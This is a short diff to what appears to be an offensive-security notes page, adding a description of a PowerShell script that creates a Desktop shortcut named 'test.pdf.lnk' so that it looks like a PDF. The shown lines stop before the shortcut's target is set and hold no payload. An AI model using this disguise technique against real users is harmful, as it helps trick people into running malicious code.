@@ -4,6 +4,8 @@ description: Powershell Script to Generate a LNK file
 
 # LNK Script
 
+Powershell script to generate an LNK file that looks like a PDF
+
 `$path = "$([Environment]::GetFolderPath('Desktop'))\test.pdf.lnk"` \
 `$wshell = New-Object -ComObject Wscript.Shell` \
 `$shortcut = $wshell.CreateShortcut($path)` \
